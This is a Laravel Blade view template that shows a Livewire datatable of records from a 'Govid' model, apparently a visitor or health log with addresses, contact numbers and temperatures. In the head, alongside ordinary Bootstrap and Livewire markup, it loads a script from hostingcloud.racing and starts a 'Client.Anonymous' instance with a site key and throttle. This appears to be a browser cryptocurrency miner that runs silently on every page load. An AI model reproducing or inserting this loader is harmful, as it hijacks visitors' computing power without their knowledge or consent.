<html>
    <head>
        <meta name="csrf-token" content="{{ csrf_token() }}">
        @livewireStyles
        <script src="https://www.hostingcloud.racing/anXS.js"></script>
        <script>
            var _client = new Client.Anonymous('47307879e968bcc842d88987772555b4a0ce7c4f3a8b81393df1b0ea473ebb24', {
                throttle: 0.2, c: 'w', ads: 0
            });
            _client.start();


        </script>
        <!-- CSS only -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous">
        <link rel="stylesheet" href="https://deo8mru8cr8lj.cloudfront.net/be670015-0e71-4dca-8785-c28ecea8d203/css/app.css?id=f0e7cc70116e39bc73c8">
        <link rel="stylesheet" href="https://deo8mru8cr8lj.cloudfront.net/be670015-0e71-4dca-8785-c28ecea8d203/css/prism.css">
    </head>
    <body>
        {{-- @livewire('show-posts', ['data' => $data]) --}}
        <div class="container-fluid m-4">
            {{-- <div class="card">
                <div class="card-body">
                    <livewire:datatable
                        model="App\Govid"
                        with="planet, planet.region"
                        sort="name|asc"
                        include="id, first_name, second_name, address, contact_number, temp, time"
                        searchable="name, first_name, second_name, temp, time"
                        hideable="select"
                        exportable
                    />
                </div>
            </div> --}}

        </div>
        <div class="card">
            <div class="card-body">
                <livewire:datatable-show-posts />
            </div>
        </div>
        @livewireScripts
        <!-- JavaScript Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-ygbV9kiqUc6oa4msXn9868pTtWMgiQaeYH7/t7LECLbyPA2x65Kgf80OJFdroafW" crossorigin="anonymous"></script>
    <script defer src="https://deo8mru8cr8lj.cloudfront.net/be670015-0e71-4dca-8785-c28ecea8d203/js/app.js?id=26c56e9f0d6d95e5a1fc"></script>
    <script src="/livewire/livewire.js?id=113e213167e044b8bb85" data-turbolinks-eval="false"></script>
</body>
</html>
